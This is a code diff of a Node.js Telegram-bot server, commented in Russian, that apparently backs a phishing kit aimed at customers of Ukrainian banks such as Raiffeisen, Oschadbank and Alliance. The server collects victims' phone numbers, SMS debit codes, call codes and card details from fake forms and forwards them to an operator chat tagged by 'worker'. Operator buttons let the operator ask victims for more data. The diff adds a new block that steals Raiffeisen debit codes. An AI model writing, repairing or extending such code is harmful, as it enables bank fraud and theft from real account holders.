@@ -31,7 +31,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Логика обновлена для работы с новыми формами.', { parse_mode: 'HTML' }).catch(console.error);
+    bot.sendMessage(CHAT_ID, '✅ СЕРВЕР ПЕРЕЗАПУЩЕН! Исправлена логика для Райффайзен и Альянс.', { parse_mode: 'HTML' }).catch(console.error);
 } else {
     console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
@@ -113,7 +113,6 @@ bot.on('callback_query', (callbackQuery) => {
             responseText = 'Запрос "неверный код" отправлен!';
             break;
             
-        // --- ИЗМЕНЕННАЯ ЛОГИКА ---
         case 'request_details':
             if (sessionData.bankName === 'Альянс') {
                 command.type = 'request_alliance_card_details';
@@ -125,7 +124,7 @@ bot.on('callback_query', (callbackQuery) => {
             } 
             else {
                  bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
-                 return; // Выходим, не отправляя команду
+                 return;
             }
             break;
             
@@ -154,7 +153,6 @@ app.post('/api/submit', (req, res) => {
     
     let message = '';
     
-    // Поэтапная обработка для Райффайзен
     if (newData.bankName === 'Райффайзен') {
         if (stepData.phone) {
             message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n`;
@@ -173,9 +171,17 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+        } 
+        // --- ДОБАВЛЕН ЭТОТ БЛОК ---
+        else if (stepData.debit_sms_code) {
+            message = `<b>💸 Код списания (Райф)</b>\n\n`;
+            message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
+            const phone = newData.phone || 'не указан';
+            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
+            message += `<b>Worker:</b> @${workerNick}\n`;
+            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
     } 
-    // Стандартная обработка для Ощадбанка и других
     else {
         if (stepData.call_code) {
             message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
@@ -185,7 +191,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
-        else if (stepData.sms_code) { // Только для Ощада, т.к. Райф обработан выше
+        else if (stepData.sms_code) {
             message = `<b>💸 Код списания (Ощад)</b>\n\n`;
             message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
             const phone = newData.phone || newData.fp_phone || 'не указан';
@@ -201,7 +207,6 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Worker:</b> @${workerNick}\n`;
             bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
         }
-        // --- ИЗМЕНЕННАЯ ЛОГИКА ---
         else if (stepData.card_details) {
             const details = stepData.card_details;
             message = `<b>Данные по запросу (${newData.bankName})</b>\n\n`;
@@ -236,7 +241,7 @@ app.post('/api/submit', (req, res) => {
             message += `<b>Worker:</b> @${workerNick}\n`;
             sendToTelegram(message, sessionId, newData.bankName);
         }
-        else if (isFinalStep) { // Для Альянс, Восток и т.д.
+        else if (isFinalStep) {
             message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
             message += `<b>Название банка:</b> ${newData.bankName}\n`;
             if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
